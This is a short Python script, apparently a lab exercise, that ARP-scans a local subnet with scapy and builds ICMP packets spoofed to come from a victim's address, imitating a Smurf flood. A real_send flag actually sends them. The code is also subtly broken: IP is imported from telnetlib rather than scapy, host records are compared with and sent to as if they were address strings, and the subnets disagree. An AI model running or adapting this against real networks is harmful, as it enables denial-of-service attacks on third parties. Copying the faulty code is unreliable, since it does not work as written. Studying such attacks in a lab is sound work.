import ipaddress

from scapy.layers.inet import ICMP
from telnetlib import IP

from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, send


def scan_network(network_range="192.168.56.0/24"):

    arp_request = ARP(pdst=network_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answered, unanswered = srp(arp_request_broadcast, timeout=2, verbose=False)

    hosts = []
    for sent, received in answered:
        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})

    return hosts


local_ip = "192.168.8.1"
netmask = "255.255.255.0"

def smurf_simulation(victim_ip, network_range="192.168.8.0/24", real_send=False):
    hosts = scan_network(network_range)
    print(f"\nDiscovered hosts in {network_range}: {hosts}")

    print(f"\n[SIMULATION] Attacker sends spoofed ICMP requests to broadcast, "
          f"pretending to be {victim_ip}\n")

    for host in hosts:
        if host != victim_ip:
            packet = IP(src=victim_ip, dst=host)/ICMP()
            print(f"Host {host} would reply to victim {victim_ip}")

            if real_send:
                send(packet, verbose=False)

    print("\nSimulation complete: victim receives ICMP flood from all hosts.")


network = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)
broadcast_ip = str(network.broadcast_address)
print("Broadcast IP:", broadcast_ip)
